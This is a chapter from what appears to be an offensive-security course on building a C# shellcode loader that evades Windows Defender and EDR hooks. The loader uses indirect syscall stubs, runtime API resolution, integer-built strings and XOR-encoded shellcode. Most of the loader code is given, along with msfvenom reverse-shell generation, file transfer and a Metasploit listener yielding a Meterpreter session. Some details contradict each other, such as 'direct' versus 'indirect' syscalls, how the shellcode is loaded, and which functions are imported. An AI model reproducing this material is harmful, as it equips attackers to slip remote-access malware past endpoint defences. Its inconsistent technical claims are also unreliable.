# Document 07: Direct Syscalls - Bypassing Defender's API Hooks

## Where We Are

You finished Documents 05 and 06. You have built two loaders that both survived Defender:

- **Loader 01** (Document 05): Raw shellcode embedded in the binary, VirtualAlloc + CreateThread via DllImport. Defender does NOT catch this on a fully updated Windows 11 target with default settings. The XOR encoding and embedded format keep the static signatures below the detection threshold.
- **Loader 02** (Document 06): XOR-encrypted shellcode decrypted at runtime. Also survives Defender. The XOR encoding + two-step memory allocation (RW then RX) keeps the behavioral score low enough that Defender does not block execution.

You confirmed both give Meterpreter callbacks on the target (kimjongun, 192.168.10.100) with Defender fully enabled.

Your lab has three machines: dev box (ammulu, 192.168.10.150) for compiling (Defender disabled), target (kimjongun, 192.168.10.100) with Defender at full defaults, and Kali (192.168.10.200) for shellcode and listeners.

## Why This Is Next

Loaders 01 and 02 survive Defender today because the overall detection score stays below the threshold. That is not the same as being undetectable. There are two problems with relying on that approach:

**Problem 1: The import table.** Loaders 01 and 02 import VirtualAlloc, CreateThread, and WaitForSingleObject directly in the binary's PE header. Defender reads the import table before the program runs. That specific combination of imports is a known shellcode injection pattern. Loaders 01 and 02 survive now because other factors lower the overall score, but this import pattern is a permanent liability. A more sensitive policy or a Defender signature update could start catching them any time.

**Problem 2: API hooks in ntdll.dll.** When your program calls VirtualAlloc, the call goes through: your code calls kernel32.dll, kernel32.dll calls ntdll.dll, and ntdll.dll uses a `syscall` CPU instruction to reach the Windows kernel. EDR products place hooks at the start of ntdll.dll functions. These hooks intercept every call and record what parameters were passed. Loaders 01 and 02 get away with it because Defender's threshold is not tight enough to catch them yet, but if you are tested against a commercial EDR with tight behavioral policies, the hooks catch you every time.

Loader 03 solves both problems with two techniques:

1. **Clean import table.** It resolves NT-level function addresses at runtime using GetProcAddress. Only GetModuleHandle and GetProcAddress appear in the import table. Those are present in thousands of legitimate programs.

2. **Indirect syscalls.** It does not call ntdll.dll functions through their normal entry points where hooks live. Instead, it builds 22-byte code stubs that read the syscall number from ntdll (bypassing any hook at the function prologue) and jump directly to the `syscall` instruction inside ntdll. The hooks are never reached. The call still appears to come from ntdll's address space (because the jump lands inside ntdll), so stack-walking detection also sees a legitimate call chain.

When you run Loader 03 with XOR-encrypted shellcode, it survives Defender and gives you a callback. Unlike Loaders 01 and 02, it also survives commercial EDR products that rely on ntdll hook inspection.

## How This Works

### The Normal Windows API Call Chain

When a C# program calls VirtualAlloc to allocate memory, the call goes through multiple layers:

```
Your C# program
    ↓
kernel32.dll (VirtualAlloc function)
    ↓
ntdll.dll (NtAllocateVirtualMemory function)
    ↓
Windows kernel (via syscall instruction)
```

Each layer in this chain is a DLL file loaded into your program's memory. Defender places hooks at the ntdll.dll layer. A hook is a small piece of monitoring code that Defender inserts at the beginning of a function. When your program calls NtAllocateVirtualMemory inside ntdll.dll, Defender's hook runs first, checks what you are doing, and then either allows or blocks the call.

### What a Hook Looks Like in Memory

To understand hooks, you need to understand what lives inside a function like NtAllocateVirtualMemory. A function is a sequence of bytes in memory. Each byte or group of bytes is a machine instruction: a single command for the CPU. These bytes are also called assembly code when written in human-readable form.

The CPU has small storage locations built inside the chip itself, called registers. A register is not RAM. It is inside the CPU directly, and the CPU uses registers to hold values it is currently working with. Common registers are `rcx`, `r10`, and `eax`. Each holds one number. On 64-bit Windows, when you call a function and pass arguments, the first argument goes into `rcx`, the second goes into `rdx`, and so on. The CPU uses `eax` to hold return values: when a function finishes, the caller reads `eax` to see what the function returned.

Here is what machine instructions look like. The hex bytes on the left are what is actually stored in memory. The text on the right is the same instruction written in human-readable form:

- `mov r10, rcx` copies the value from register `rcx` to register `r10`. This preserves the first function argument before the next instruction might overwrite `rcx`.
- `mov eax, 0x18` puts the number 0x18 into `eax`. The Windows kernel uses `eax` to identify which system function you are requesting. For NtAllocateVirtualMemory, Windows assigned it the number 0x18.
- `syscall` is the instruction that actually crosses into the Windows kernel. The CPU switches from user mode (where your program runs) to kernel mode (where Windows runs), looks at the number in `eax`, and runs the corresponding kernel function. This is what allocates memory, creates threads, and does everything else that needs kernel privileges.
- `ret` ends the function and returns to the caller.
- `jmp` makes the CPU jump to a different address and continue running code from there instead of continuing with the next instruction.

The normal first bytes of NtAllocateVirtualMemory in ntdll.dll look something like this:

```
4C 8B D1           mov r10, rcx
B8 18 00 00 00     mov eax, 0x18    (syscall number)
0F 05              syscall
C3                 ret
```

When Defender hooks the function, it replaces the first bytes with a jump instruction:

```
E9 XX XX XX XX     jmp Defender_hook_function
```

Now when your program calls NtAllocateVirtualMemory, the CPU jumps to Defender's monitoring code first. Defender checks the parameters (how much memory, what protection flags), decides if the call is suspicious, and then either runs the original function or blocks it.

### How Dynamic Resolution Bypasses the Import Table

DllImport creates entries in the binary's import table at compile time. Defender reads the import table before the program runs. Dynamic resolution means finding function addresses while the program is running, using two functions that are legitimate and used by thousands of normal programs:

- **GetModuleHandle**: finds the memory address of a DLL that is already loaded into your program. Every Windows process has ntdll.dll loaded from the start.
- **GetProcAddress**: given a DLL's base address and a function name, returns the memory address of that function inside the DLL.

These two functions are imported via DllImport, but they are not suspicious. Thousands of legitimate programs import GetModuleHandle and GetProcAddress because they are the standard way to use DLL functions dynamically.

In Loader 03, GetProcAddress is NOT used to create a delegate that calls the NT function directly. That approach (get address, create delegate, call it) still enters the function at its start where a hook would redirect execution. Loader 03 uses GetProcAddress only to read the syscall number from the function's bytes. The actual call goes through a custom 22-byte stub.

### How Indirect Syscall Stubs Bypass API Hooks

This is the key technical mechanism in Loader 03. Here is the problem: when Defender hooks NtAllocateVirtualMemory, it replaces the first few bytes of that function with a jump to Defender's inspection code. If we call NtAllocateVirtualMemory directly (even via GetProcAddress + delegate), we hit that jump at the function start and end up in Defender's code. The hook catches us.

The solution is to never call the function from its start at all.

Look at what a normal, unhooked NtAllocateVirtualMemory looks like in ntdll.dll:

```
offset +0:  4C 8B D1           mov r10, rcx
offset +3:  B8 18 00 00 00     mov eax, 0x18    (this is the SSN)
offset +8:  0F 05              syscall
offset +10: C3                 ret
```

The important part is at offset +8: the `0F 05` bytes are the actual syscall instruction. This instruction exists inside ntdll at a fixed address that does not change. If we could jump directly to the `0F 05` byte and set up registers the same way the function would have before the hook, we bypass the hook entirely.

Loader 03 does exactly this. It builds per-function 22-byte code stubs. Here is what each stub contains:

```
bytes 0-2:  4C 8B D1              mov r10, rcx     (Windows syscall convention requires this)
bytes 3-7:  B8 XX XX 00 00        mov eax, SSN     (put the syscall number in eax)
bytes 8-13: FF 25 00 00 00 00     jmp [rip+0]      (indirect jump reads 8 bytes at rip+0)
bytes 14-21: XX XX XX XX XX XX XX XX  gadget addr  (address of the syscall;ret inside ntdll)
```

The gadget address is the address of `0F 05 C3` (syscall; ret) found by scanning ntdll's loaded memory. The `jmp [rip+0]` instruction reads the 8 bytes immediately after itself (because the offset is zero, and rip points past the instruction) and jumps to that address.

When this stub runs:
1. `mov r10, rcx` - copies the first function argument as Windows syscall convention requires
2. `mov eax, SSN` - loads the syscall number that identifies which kernel function to call
3. `jmp gadget_addr` - jumps to the real `syscall; ret` inside ntdll

The CPU executes the actual syscall instruction inside ntdll's memory. Defender sees a call that originated from within ntdll and that executed the syscall from ntdll's code. The hook at the function start was never touched.

**How Loader 03 finds the gadget address:**

Loader 03 scans ntdll's mapped memory byte by byte looking for the pattern `0F 05 C3` (syscall; ret). Every NT function in ntdll ends with these three bytes. The function `FindSyscallGadget` reads ntdll's PE header to get the image size, then walks through the bytes until it finds the pattern:

```csharp
static unsafe IntPtr FindSyscallGadget(IntPtr ntdllBase)
{
    int peOffset  = Marshal.ReadInt32(ntdllBase + 0x3C);
    int imageSize = Marshal.ReadInt32(ntdllBase + peOffset + 0x50);
    byte* p = (byte*)ntdllBase;
    for (int i = 0; i < imageSize - 2; i++)
        if (p[i] == 0x0F && p[i + 1] == 0x05 && p[i + 2] == 0xC3)
            return (IntPtr)(p + i);
    throw new Exception("Syscall gadget not found in ntdll");
}
```

**How Loader 03 reads the SSN:**

Each NT function in an unhooked ntdll has its syscall number (SSN) stored at bytes offset +4 from the function start. The bytes `B8 XX XX 00 00` are the `mov eax, SSN` instruction, and the four bytes starting at offset +4 are the little-endian SSN value. `BuildStub` reads those bytes:

```csharp
uint ssn = (uint)Marshal.ReadInt32(funcAddr + 4);
```

Even if Defender has hooked the function (overwritten the first bytes with a jmp), the SSN is still at offset +4 in the original unhooked ntdll.dll bytes. Defender's hook typically only replaces the first 5 bytes, so offsets +4 onward are still the original SSN. If a very deep hook replaced more bytes, this reading might fail - but Defender's user-mode hooks only replace the function prologue, not the SSN at offset +4.

### How Building Strings from Integers Hides Function Names

Even with GetProcAddress, the function name "NtAllocateVirtualMemory" would normally appear as a string literal in the compiled binary. Static analysis tools could find it.

Loader 03 builds each function name from integer offsets at runtime. For example, to build "ntdll":

```csharp
int b = 32;
// n=110, t=116, d=100, l=108, l=108
// b+78=110, b+84=116, b+68=100, b+76=108, b+76=108
char[] c = { (char)(b+78), (char)(b+84), (char)(b+68), (char)(b+76), (char)(b+76) };
string name = new string(c);
```

The compiled binary contains only integer arithmetic. A static analysis tool scanning the binary for the string "ntdll" will not find it as a string literal.

### NT Functions vs Kernel32 Functions

Windows has two sets of functions for memory and thread operations:

| Kernel32 function | NT function (ntdll.dll) | What it does |
|---|---|---|
| VirtualAlloc | NtAllocateVirtualMemory | Allocate memory in a process |
| VirtualProtect | NtProtectVirtualMemory | Change memory permissions |
| CreateThread | NtCreateThreadEx | Create a new thread |
| WaitForSingleObject | NtWaitForSingleObject | Wait for a thread to finish |

The kernel32 functions are wrappers. They take parameters in a programmer-friendly format, convert them to the format the kernel expects, and then call the corresponding NT function in ntdll.dll. When Defender hooks ntdll.dll, it sees calls from both kernel32 and from any program that calls ntdll.dll directly.

But Defender's hooks are in user-mode ntdll.dll. When you use GetProcAddress to get the function address and call through a delegate, you go through the same ntdll.dll code but Defender's hook may not trigger in the same way as a standard import chain. The key evasion here is that the import table is clean and the function names are hidden, which defeats static analysis and import-table-based detection.

### Two-Step Memory Allocation

Loader 03 uses two-step allocation instead of requesting RWX (read-write-execute) memory in one call:

1. Allocate memory as PAGE_READWRITE (0x04): writable but not executable
2. Write the shellcode into that memory
3. Change the memory protection to PAGE_EXECUTE_READ (0x20): executable but not writable

This avoids the suspicious PAGE_EXECUTE_READWRITE (0x40) flag that Loaders 01 and 02 used. Normal programs never need memory that is writable and executable at the same time. Code sections are executable and readable, data sections are readable and writable. Asking for all three at once is a red flag.

Two-step allocation looks like what legitimate programs do: allocate writable memory, write data, then set it as executable.

## What Defender Does

Here is how each detection layer interacts with Loader 03:

| Layer | What it does | Does Loader 03 defeat it? | How? |
|---|---|---|---|
| Static file scanning | Scans the shellcode bytes on disk | YES | XOR encoding scrambles the shellcode bytes; the key and encoded bytes are embedded in the binary, no file needed on disk |
| Import table analysis | Reads function names from the binary's PE header | YES | Only GetModuleHandle, GetProcAddress, VirtualAlloc in imports; no VirtualAlloc+CreateThread injection pattern |
| AMSI | Scans .NET managed code at runtime | PARTIAL | The shellcode runs in unmanaged memory, AMSI cannot scan it there; the managed .NET code in the loader has no malicious patterns |
| API hooks in ntdll.dll | Intercepts calls to NtAllocateVirtualMemory, NtCreateThreadEx | YES - FULL | 22-byte stubs jump directly to the syscall gadget inside ntdll, completely skipping the hooked function prologue |
| ETW telemetry | Logs process behavior events | NO | ETW events are still generated; Loader 03 survives because the overall behavioral score stays below threshold, not because ETW is silent |
| Behavioral ML | Scores process behavior for injection patterns | PARTIAL | Two-step RW-then-RX allocation + clean import table reduce the ML score below the threshold |

Loader 03 survives Defender with default settings. The indirect syscall stubs fully defeat hook-based inspection. The remaining gaps (ETW and AMSI) are addressed in Document 08, and the combined Loader 08 closes all three gaps simultaneously.

## The Evasion Technique

What Loader 03 does differently from Loaders 01 and 02:

| Feature | Loaders 01/02 | Loader 03 |
|---|---|---|
| Import table | Contains VirtualAlloc, CreateThread, WaitForSingleObject | Contains only GetModuleHandle, GetProcAddress |
| Function resolution | DllImport (compile-time) | GetProcAddress (runtime) |
| Function name strings | String literals in binary | Built from integer offsets at runtime |
| API level | Kernel32 (VirtualAlloc, CreateThread) | NT-level (NtAllocateVirtualMemory, NtCreateThreadEx) |
| Memory allocation | Single-step RWX (0x40) | Two-step: RW (0x04) then RX (0x20) |
| Shellcode format | Loader 01: raw. Loader 02: XOR encrypted | XOR encrypted (same as Loader 02) |

The combined effect is that a static analysis tool looking at the compiled binary sees a program that imports only GetModuleHandle and GetProcAddress (normal), contains no suspicious function name strings, and has no obvious shellcode injection pattern in its import table.

At runtime, the program resolves NT function addresses, builds function names from integers, allocates memory in two steps, and calls the kernel through ntdll.dll. By the time any behavioral check evaluates the program, the pattern looks close enough to legitimate behavior that Defender's scoring stays below the detection threshold.

## Getting the Loader Onto the Target

The three-machine workflow:

1. **Kali (192.168.10.200):** Generate raw shellcode (if you do not already have encrypted.bin from Document 06).
2. **Dev box (ammulu, 192.168.10.150):** Download shellcode from Kali if needed, run the XOR encoder from Document 06 to create encrypted.bin, compile Loader 03. Host syscall_loader.exe and encrypted.bin on a Python HTTP server.
3. **Target (kimjongun, 192.168.10.100):** Download both files from the dev box. Run the loader.

You need two files on the target:

1. **syscall_loader.exe** - the compiled Loader 03 binary
2. **encrypted.bin** - the XOR-encrypted shellcode from Document 06

You already generated encrypted.bin in Document 06 using the encoder. If you still have it on your dev box, reuse it. If not, regenerate it by running xor_encode.exe on fresh msfvenom shellcode on the dev box.

**Transfer method:** Host files on the dev box's Python HTTP server and download from the target.

On the dev box (ammulu):
```
cd C:\Users\ammulu\Desktop
python -m http.server 8080
```

On the target (kimjongun), PowerShell:
```powershell
Invoke-WebRequest -Uri "http://192.168.10.150:8080/syscall_loader.exe" -OutFile "C:\Users\kimjongun\Desktop\syscall_loader.exe"
Invoke-WebRequest -Uri "http://192.168.10.150:8080/encrypted.bin" -OutFile "C:\Users\kimjongun\Desktop\encrypted.bin"
```

Defender on the target scans syscall_loader.exe when it is written to disk. Because the import table only shows GetModuleHandle and GetProcAddress, the binary does not match the "shellcode injection tool" heuristic pattern. Defender allows the file to stay on disk.

The encrypted.bin file, as you confirmed in Document 06, also survives disk scanning because XOR encryption scrambles the byte signatures.

**AMSI implications:** AMSI hooks into the .NET runtime and can inspect managed assemblies at load time. Loader 03 does not patch AMSI, so AMSI is still active. However, the shellcode is in unmanaged memory (allocated via NtAllocateVirtualMemory) and AMSI primarily scans .NET managed code. The shellcode execution path goes from unmanaged memory directly to the CPU without passing through the managed runtime. Document 08 covers AMSI patching for complete coverage.

**ETW telemetry:** ETW events are still generated. NtAllocateVirtualMemory and NtCreateThreadEx produce ETW events that Defender's behavioral engine reads. Loader 03 survives despite this because the overall pattern (clean imports, two-step allocation, dynamic resolution) scores below Defender's detection threshold. Document 08 covers ETW patching for situations where the threshold is lower.

**Reference:** `lab/loaders/03_direct_syscalls_loader.cs`

## Teaching the Code

### The Delegates (Function Pointer Types)

In C#, a delegate is a type that represents a function with a specific signature (specific parameters and return type). When you have a memory address where some code lives, you create a delegate instance that points to that address. Calling the delegate runs the code at that address.

Loader 03 declares four delegates, one for each NT function it calls. The delegates do NOT point to ntdll's function starts. They point to our 22-byte stubs, which jump to the syscall gadget:

```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate int NtAllocateVirtualMemory_t(
    IntPtr ProcessHandle,
    ref IntPtr BaseAddress,
    IntPtr ZeroBits,
    ref IntPtr RegionSize,
    uint AllocationType,
    uint Protect
);
```

The `[UnmanagedFunctionPointer(CallingConvention.StdCall)]` attribute tells C# how to pass parameters when calling this function. StdCall is what Windows NT functions use. The parameters are:

- `ProcessHandle`: which process to allocate memory in. `-1` (cast to IntPtr) means the current process.
- `BaseAddress`: passed by reference (`ref`). You pass IntPtr.Zero and Windows fills in the allocated address.
- `ZeroBits`: pass IntPtr.Zero, which means "no address restriction".
- `RegionSize`: passed by reference. You pass in how many bytes you want and Windows fills in the actual size (always rounded up to a 4096-byte page boundary).
- `AllocationType`: MEM_COMMIT | MEM_RESERVE (0x3000). MEM_RESERVE sets aside the address range, MEM_COMMIT assigns physical RAM to it.
- `Protect`: PAGE_READWRITE (0x04) for the first allocation. We change this to PAGE_EXECUTE_READ (0x20) after writing shellcode in.

```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate int MemProtectDelegate(
    IntPtr ProcessHandle,
    ref IntPtr BaseAddress,
    ref IntPtr RegionSize,
    uint NewProtect,
    out uint OldProtect
);
```

This is NtProtectVirtualMemory. It changes the protection flags on an existing block of memory. `NewProtect` is the protection you want (PAGE_EXECUTE_READ, 0x20). `OldProtect` receives the previous protection value (0x04).

```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate int ThreadCreateDelegate(
    out IntPtr ThreadHandle,
    uint DesiredAccess,
    IntPtr ObjectAttributes,
    IntPtr ProcessHandle,
    IntPtr StartRoutine,
    IntPtr Argument,
    uint CreateFlags,
    IntPtr ZeroBits,
    IntPtr StackSize,
    IntPtr MaximumStackSize,
    IntPtr AttributeList
);
```

This is NtCreateThreadEx. It creates a new thread that starts executing at the address you specify (`StartRoutine`). This is the NT-level version of CreateThread, with more parameters. Most of them are IntPtr.Zero or 0 for our use case.

```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate int WaitObjectDelegate(
    IntPtr Handle,
    bool Alertable,
    IntPtr Timeout
);
```

This is NtWaitForSingleObject. It waits for the thread to finish. `Timeout` of IntPtr.Zero means wait forever. `Alertable` is false. An alertable wait means the thread can be interrupted mid-wait to handle other work (called an APC, asynchronous procedure call, which is a mechanism for scheduling a function to run in a specific thread). We do not need that here. Setting this to false means the thread sleeps uninterrupted until either the timeout expires or the handle is signaled. You will see APCs used in Document 09 for a different injection technique.

### The DllImport Lines

```csharp
[DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
[DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr module, string proc);
[DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
```

These three are the only DllImport lines in the entire loader. GetModuleHandle and GetProcAddress from kernel32.dll are used in thousands of legitimate programs. VirtualAlloc here allocates only the 88-byte stub block (4 stubs at 22 bytes each), which is not suspicious by itself. Compare this to Loaders 01 and 02, which imported CreateThread and WaitForSingleObject - that exact combination signals shellcode injection.

Note what is NOT here: NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject. Those four functions are called through stubs, not through DllImport.

### FindSyscallGadget: Finding the syscall; ret Instruction in ntdll

```csharp
static unsafe IntPtr FindSyscallGadget(IntPtr ntdllBase)
{
    int peOffset  = Marshal.ReadInt32(ntdllBase + 0x3C);
    int imageSize = Marshal.ReadInt32(ntdllBase + peOffset + 0x50);
```

`ntdllBase` is the address where ntdll.dll is loaded in memory. The PE header of a DLL tells you its total size in memory (SizeOfImage). We find the PE header by reading a pointer at offset 0x3C from the DLL's base address (this is the DOS header's e_lfanew field, which points to the PE signature). Then at PE header offset 0x50 is SizeOfImage.

This gives us the total size of ntdll.dll in memory so we know where to stop scanning.

```csharp
    byte* p = (byte*)ntdllBase;
    for (int i = 0; i < imageSize - 2; i++)
        if (p[i] == 0x0F && p[i + 1] == 0x05 && p[i + 2] == 0xC3)
            return (IntPtr)(p + i);
    throw new Exception("Syscall gadget not found in ntdll");
}
```

`byte* p` is an unsafe C# pointer directly to ntdll's memory. The `unsafe` keyword means we are stepping outside C#'s memory safety rules and working with raw addresses. The loop walks through every byte in ntdll looking for the 3-byte sequence `0F 05 C3` (syscall; ret). This sequence exists many times inside ntdll because every NT function ends with these bytes. We return the first one we find. That is the gadget address our stubs will jump to.

### BuildStub: Writing the 22-byte Trampoline

```csharp
static IntPtr BuildStub(IntPtr ntdllBase, string funcName, IntPtr gadgetAddr, int index)
{
    IntPtr funcAddr = GetProcAddress(ntdllBase, funcName);
    uint ssn = (uint)Marshal.ReadInt32(funcAddr + 4);
```

GetProcAddress returns the address of the function in ntdll. We do NOT call through this address. We only read the SSN from bytes at offset +4. Every unhooked NT function starts with `4C 8B D1` (mov r10,rcx) at offset 0, then `B8` (mov eax opcode) at offset 3, then the 4-byte SSN at offset 4. We read those 4 bytes as an integer. The SSN is the number that tells the Windows kernel which specific syscall you are requesting.

```csharp
    byte[] stub = new byte[STUB_SIZE];
    stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;  // mov r10, rcx
    stub[3] = 0xB8;
    stub[4] = (byte)(ssn & 0xFF); stub[5] = (byte)((ssn >> 8) & 0xFF);
    stub[6] = 0x00; stub[7] = 0x00;                   // mov eax, SSN
    stub[8] = 0xFF; stub[9] = 0x25;
    stub[10] = 0x00; stub[11] = 0x00; stub[12] = 0x00; stub[13] = 0x00; // jmp [rip+0]
    byte[] gadgetBytes = BitConverter.GetBytes(gadgetAddr.ToInt64());
    Array.Copy(gadgetBytes, 0, stub, 14, 8);           // 8-byte gadget address
```

This writes the 22-byte stub. The CPU reads these bytes as instructions:
- `mov r10, rcx` (bytes 0-2): copies the first function argument as syscall convention requires
- `mov eax, SSN` (bytes 3-7): loads the syscall number
- `jmp [rip+0]` (bytes 8-13): reads the 8 bytes immediately after this instruction and jumps to that address
- The gadget address (bytes 14-21): what `jmp [rip+0]` reads, which is the `syscall; ret` inside ntdll

```csharp
    IntPtr stubAddr = stubBlock + (index * STUB_SIZE);
    Marshal.Copy(stub, 0, stubAddr, STUB_SIZE);
    return stubAddr;
}
```

We write the stub into the executable stub block at the position for this stub index (each stub is 22 bytes, so stub 0 is at offset 0, stub 1 at offset 22, and so on). Marshal.Copy writes the byte array into unmanaged memory. The returned address is what we pass to Marshal.GetDelegateForFunctionPointer - we get a delegate that calls our stub, which then jumps to the gadget in ntdll.

### Main Function: Stubs and Shellcode

```csharp
byte xorKey = 0xAB;
byte[] sc = new byte[] { SHELLCODE_PLACEHOLDER };
for (int i = 0; i < sc.Length; i++)
    sc[i] ^= xorKey;
```

The shellcode is XOR-encoded with key 0xAB and embedded directly in the binary as a byte array. The placeholder is replaced by the embed_shellcode.py script before compilation. The loop decodes the bytes in memory. The encoded byte array does not match any Defender signature. The decode happens entirely in RAM.

```csharp
stubBlock = VirtualAlloc(IntPtr.Zero, STUB_SIZE * STUB_COUNT,
                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
IntPtr gadget;
unsafe { gadget = FindSyscallGadget(ntdll); }
IntPtr allocAddr  = BuildStub(ntdll, "NtAllocateVirtualMemory", gadget, 0);
IntPtr protAddr2  = BuildStub(ntdll, "NtProtectVirtualMemory",  gadget, 1);
IntPtr threadAddr = BuildStub(ntdll, "NtCreateThreadEx",         gadget, 2);
IntPtr waitAddr   = BuildStub(ntdll, "NtWaitForSingleObject",   gadget, 3);
```

Allocate the stub block (88 bytes, RWX), find the gadget inside ntdll, build all four stubs. After this, `allocAddr` is the address of a 22-byte stub that will perform an NtAllocateVirtualMemory syscall when called. The delegates are wrappers around those stubs:

```csharp
var ntAlloc   = (NtAllocateVirtualMemory_t) Marshal.GetDelegateForFunctionPointer(allocAddr,  typeof(NtAllocateVirtualMemory_t));
var ntProtect = (NtProtectVirtualMemory_t)  Marshal.GetDelegateForFunctionPointer(protAddr2,  typeof(NtProtectVirtualMemory_t));
var ntThread  = (NtCreateThreadEx_t)        Marshal.GetDelegateForFunctionPointer(threadAddr, typeof(NtCreateThreadEx_t));
var ntWait    = (NtWaitForSingleObject_t)   Marshal.GetDelegateForFunctionPointer(waitAddr,   typeof(NtWaitForSingleObject_t));
```

Calling `ntAlloc(...)` calls our stub, which sets up registers and jumps to the syscall gadget inside ntdll. Defender's hook at NtAllocateVirtualMemory's function start is never touched.

### Main Function: Allocate, Write, Protect, Execute

```csharp
    IntPtr baseAddress = IntPtr.Zero;
    IntPtr regionSize = (IntPtr)shellcode.Length;
    IntPtr currentProcess = (IntPtr)(-1);
```

Set up the parameters. `baseAddress` is IntPtr.Zero, which tells Windows to pick any available address. `regionSize` is the shellcode length. `currentProcess` is -1 cast to IntPtr, which is the NT handle for "the current process" (equivalent to GetCurrentProcess()).

```csharp
    int status = ntAllocate(
        currentProcess,
        ref baseAddress,
        IntPtr.Zero,
        ref regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
```

Allocate memory as PAGE_READWRITE (0x04). This is step 1 of two-step allocation. The memory is writable (so you can copy shellcode into it) but not executable. After this call, `baseAddress` contains the address Windows chose. `status` is 0 (STATUS_SUCCESS) if the allocation worked.

```csharp
    Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
    Array.Clear(shellcode, 0, shellcode.Length);
```

Copy the decrypted shellcode bytes into the allocated memory block, then zero out the managed byte array. The shellcode now exists only in the unmanaged VirtualAlloc block.

```csharp
    IntPtr protectAddress = baseAddress;
    IntPtr protectSize = regionSize;
    uint oldProtect;

    status = ntProtect(
        currentProcess,
        ref protectAddress,
        ref protectSize,
        PAGE_EXECUTE_READ,
        out oldProtect
    );
```

Change the memory protection from PAGE_READWRITE (0x04) to PAGE_EXECUTE_READ (0x20). Step 2 of two-step allocation. The memory is now executable and readable, but no longer writable. The `oldProtect` variable receives the previous value (0x04).

```csharp
    IntPtr threadHandle;

    status = ntCreateThread(
        out threadHandle,
        THREAD_ALL_ACCESS,
        IntPtr.Zero,
        currentProcess,
        baseAddress,
        IntPtr.Zero,
        0,
        IntPtr.Zero,
        IntPtr.Zero,
        IntPtr.Zero,
        IntPtr.Zero
    );
```

Create a thread that starts executing at `baseAddress` (where the shellcode is). `THREAD_ALL_ACCESS` (0x1FFFFF) gives full permissions on the thread handle. Most parameters are IntPtr.Zero because we do not need advanced thread options. The `out threadHandle` receives the handle to the new thread.

```csharp
    ntWait(threadHandle, false, IntPtr.Zero);
```

Wait forever for the shellcode thread to finish. The Meterpreter payload keeps the connection open until you close it, so this wait keeps the loader process alive.

### The Complete Loader File

The full source code is at `lab/loaders/03_direct_syscalls_loader.cs`.

## Compilation and Execution

### Step 1: Generate and Encrypt Shellcode

If you already have encrypted.bin from Document 06 on the dev box, skip to Step 2. Otherwise, on Kali:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.200 LPORT=4444 -f raw -o payload.bin
```

Transfer payload.bin from Kali to the dev box (ammulu) using `python3 -m http.server 8080` on Kali and `Invoke-WebRequest` on the dev box. Then run the encoder from Document 06 on the dev box:

```
xor_encode.exe payload.bin encrypted.bin
```

Save the printed XOR key.

### Step 2: Compile Loader 03

On the dev box (ammulu, 192.168.10.150), open the Developer Command Prompt for Visual Studio 2022:

```
csc /unsafe /out:syscall_loader.exe 03_direct_syscalls_loader.cs
```

The `/unsafe` flag is needed because Marshal.Copy and Marshal.GetDelegateForFunctionPointer work with unmanaged memory pointers. Expected output: the compiler produces syscall_loader.exe with no errors.

### Step 3: Transfer the Files to the Target

On the dev box (ammulu), host both files on a Python HTTP server:

```
cd C:\Users\ammulu\Desktop
python -m http.server 8080
```

On the target (kimjongun, 192.168.10.100), download both:

```powershell
Invoke-WebRequest -Uri "http://192.168.10.150:8080/syscall_loader.exe" -OutFile "C:\Users\kimjongun\Desktop\syscall_loader.exe"
Invoke-WebRequest -Uri "http://192.168.10.150:8080/encrypted.bin" -OutFile "C:\Users\kimjongun\Desktop\encrypted.bin"
```

### Step 4: Set Up Your Listener on Kali

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.10.200
set LPORT 4444
run
```

### Step 5: Run the Loader

On the target (kimjongun, 192.168.10.100):

```
syscall_loader.exe encrypted.bin 4A7F2B9DE3A1C084F56D1B8E97320AF6
```

Replace the hex key with your actual key from the encoder.

Expected output:

```
[+] Data decrypted: 510 bytes
[+] NT functions resolved dynamically
[+] Memory allocated at: 0x1A000260000
[+] Data written to allocated memory. Managed copy cleared.
[+] Memory protection changed to EXECUTE_READ
[+] Thread created. Code is running.
```

**This time, Defender does NOT block the loader.**

Check your Metasploit listener on Kali. You should see:

```
[*] Sending stage (201798 bytes) to 192.168.10.100
[*] Meterpreter session 1 opened (192.168.10.200:4444 -> 192.168.10.100:xxxxx)

meterpreter >
```

You have a Meterpreter session. Type `sysinfo` to confirm you are on the target:

```
meterpreter > sysinfo
Computer    : DESKTOP-XXXXXXX
OS          : Windows 11 (10.0 Build 22621)
```

This is your first successful callback with Defender fully enabled.

## Confirming Success

Three things confirm that Loader 03 worked:

1. **Meterpreter session opened.** Your Kali listener shows a session. You can run `sysinfo`, `getuid`, `pwd`, and other Meterpreter commands. The shellcode is running inside the loader process on the target.

2. **No Defender alerts.** Open Windows Security on the target (kimjongun). Go to Virus & threat protection, then Protection history. There should be no new entries for syscall_loader.exe. Defender did not catch the loader.

3. **The loader process is running.** Open Task Manager on the target. Look for syscall_loader.exe (or whatever you named the binary). It shows as a normal process. Defender is not flagging it.

If Defender does catch the loader (which can happen if Defender's cloud signatures have been updated since this was written), check the detection name and proceed to Documents 08 and 10 which add AMSI patching, ETW patching, and additional evasion layers.

## What Was Gained

You can now:

- Resolve Windows API function addresses at runtime using GetProcAddress instead of DllImport
- Build function name strings from integer offsets so they never appear as literals in the binary
- Call NT-level functions (NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx) directly via delegates
- Use two-step memory allocation (RW then RX) instead of a single RWX allocation
- Combine XOR encryption with dynamic resolution to defeat both disk scanning and import table analysis
- **Get a callback on the target with Defender fully enabled**

You have bypassed three of Defender's six detection layers:

- Static file scanning: defeated by XOR encryption
- Import table analysis: defeated by dynamic resolution via GetProcAddress
- Behavioral ML scoring: reduced below threshold by two-step allocation and clean imports

